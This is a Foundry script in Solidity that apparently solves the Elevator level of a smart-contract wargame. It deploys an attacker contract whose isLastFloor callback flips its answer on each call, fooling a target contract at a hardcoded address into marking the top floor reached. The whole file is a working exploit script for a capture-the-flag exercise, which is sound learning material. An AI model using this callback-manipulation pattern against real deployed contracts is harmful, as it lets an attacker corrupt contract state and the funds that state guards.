//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";

contract AttackBuilding {

    Elevator target;
    bool toggle;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() public {
        target.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }
}

contract ElevatorSolution is Script {

    function run() public {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackBuilding attack = new AttackBuilding(
            0x50C677101906d05bD64e0e8b923B93dBDAfC64D3
        );

        attack.attack();

        vm.stopBroadcast();
    }
}